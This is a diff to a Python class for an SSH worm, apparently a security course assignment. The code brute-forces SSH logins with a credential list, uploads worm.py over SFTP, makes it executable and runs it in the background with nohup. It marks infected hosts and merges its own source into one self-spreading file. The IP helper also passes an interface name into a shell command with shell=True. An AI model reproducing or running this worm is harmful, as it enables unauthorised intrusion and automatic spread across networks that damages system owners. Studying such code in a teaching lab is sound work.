@@ -2,18 +2,37 @@ import paramiko
 import nmap
 import socket
 import os
+import shutil
+import subprocess
+
+DEBUG = True
+
+try:
+	dprint
+except:
+	def dprint(msg, debug=True):
+		if debug:
+			print(msg)
 
 class Replicator(object):
 
 	# The file marking whether the worm should spread
-	INFECTED_MARKER_FILE = "/tmp/infected.txt"
+
+	INFECTED_MARKER_FILE      = "/tmp/infected.txt"
+	WORM_FILE                 = "/tmp/worm.py"
+	REPLICATOR_CLASS_FILE     = "/tmp/Replicator.py"
+	DEBUG_OUTPUT_FILE         = "/tmp/output.txt"
+	COMPILE_TMP_DIRECTORY     = ".tmp"
+	INFECTED_MARKER_DIRECTORY = "/tmp"
+	HOST_MARKER_FILE          = "host.txt"
 
 	# Connection indicators
 	SUCCESSFUL_CONNECTION = 0
 	BAD_CREDENTIALS = 1
 	CONNECTION_ERROR = 3
 
-	sshClient = None
+	sshClient      = None
+	host           = None
 	credentialList = None
 
 	def __init__(self, credList):
@@ -21,28 +40,64 @@ class Replicator(object):
 		self.sshClient = paramiko.SSHClient()
 		self.sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-	def spreadAndExecute(self):
+	def spreadAndExecute(self, isHost):
+
 		sftpClient = self.sshClient.open_sftp()
 
-		sftpClient.put("worm.py", "/tmp/" + "worm.py")
-	
-		self.sshClient.exec_command("chmod a+x /tmp/worm.py")
+		if isHost:
+			self.compileWorm()
+			sftpClient.put(Replicator.COMPILE_TMP_DIRECTORY + "/worm.py", Replicator.WORM_FILE)
+		else:
+			sftpClient.put("worm.py", Replicator.WORM_FILE)
 
-		# self.sshClient.exec_command("nohup python /tmp/worm.py &")
-		self.sshClient.exec_command("python /tmp/worm.py")
+		self.sshClient.exec_command("chmod a+x " + Replicator.WORM_FILE)
+
+		if DEBUG:
+			self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " > " + Replicator.DEBUG_OUTPUT_FILE + " 2>&1 &")
+		else:
+			self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " &")
+
 
 	def tryCredentials(self, host, username, password):
 		try:
 			self.sshClient.connect(host, username=username, password=password)
 
 		except socket.error:
-			print('ERROR: Connection error...')
 			return Replicator.CONNECTION_ERROR
 		except paramiko.SSHException:
-			print('ERROR: Bad credentials...')
 			return Replicator.BAD_CREDENTIALS
 
 		return Replicator.SUCCESSFUL_CONNECTION
+
+	def compileWorm(self):
+
+		# Create temporary directory to put the generated file
+		if os.path.isdir(Replicator.COMPILE_TMP_DIRECTORY):
+			self.deleteCompiledWorm()
+
+		os.makedirs(Replicator.COMPILE_TMP_DIRECTORY)
+
+		# Copy worm.py
+		shutil.copy2("worm.py", Replicator.COMPILE_TMP_DIRECTORY)
+
+		# Get the contents of Replicator.py
+		f = open("Replicator.py", "r")
+		replicatorContents = f.read()
+		f.close()
+
+		# Get the contents of worm.py
+		f = open("worm.py", "r")
+		wormContents = f.read()
+		f.close()
+
+		# Find the location in worm.py to dump the Replicator class in
+		f = open(Replicator.COMPILE_TMP_DIRECTORY + "/worm.py", "w")
+		wormContents = wormContents.replace("from Replicator import Replicator", replicatorContents)
+		f.write(wormContents)
+		f.close()
+
+	def deleteCompiledWorm(self):
+		shutil.rmtree(Replicator.COMPILE_TMP_DIRECTORY)
 
 	def attackSystem(self, host):
 
@@ -52,9 +107,8 @@ class Replicator(object):
 
 			attemptResults = self.tryCredentials(host, username, password)
 
-			print('(' + username + ', ' + password + '): ' + str(attemptResults))
-
 			if attemptResults == Replicator.SUCCESSFUL_CONNECTION:
+				dprint('(' + username + ', ' + password + '): ' + Replicator.desc(attemptResults), DEBUG)
 				return (attemptResults, self.sshClient) # Possibly need a copy of the instance?
 
 		return (attemptResults, None)
@@ -63,9 +117,18 @@ class Replicator(object):
 		sftpClient = self.sshClient.open_sftp()
 
 		try:
-			sftpClient.get(Replicator.INFECTED_MARKER_FILE, '/home/cpsc/')
+			sftpClient.get(Replicator.INFECTED_MARKER_FILE, Replicator.INFECTED_MARKER_DIRECTORY)
 		except IOError:
-			print("This system should be infected")
+			return False
+
+		return True
+
+	def remoteSystemIsHost(self):
+		sftpClient = self.sshClient.open_sftp()
+
+		try:
+			sftpClient.get(Replicator.HOST_MARKER_FILE, Replicator.INFECTED_MARKER_DIRECTORY)
+		except IOError:
 			return False
 
 		return True
@@ -79,10 +142,26 @@ class Replicator(object):
 		open(Replicator.INFECTED_MARKER_FILE, 'a').close()
 
 	@staticmethod
-	def getMyIP():
+	def markAsHost():
+		open(Replicator.HOST_MARKER_FILE, 'a').close()
+
+	@staticmethod
+	def getMyIP(ifname):
 		# Using other method for getting current IP. Original example given in the sample
 		# code was generating errors.
-		return socket.gethostbyname(socket.gethostname())
+		ip = subprocess.check_output("echo $(ifconfig " + ifname + " | awk -F: '/inet addr:/ {print $2}' | awk '{ print $1 }')", shell=True)
+
+		# Get rid of newline
+		return ip.strip().decode('utf-8')
+
+	@staticmethod
+	def desc(status):
+		if status == Replicator.SUCCESSFUL_CONNECTION:
+			return "SUCCESSFUL_CONNECTION"
+		elif status == Replicator.BAD_CREDENTIALS:
+			return "BAD_CREDENTIALS"
+		elif status == Replicator.CONNECTION_ERROR:
+			return "CONNECTION_ERROR"
 
 	@staticmethod
 	def getHostsOnTheSameNetwork():
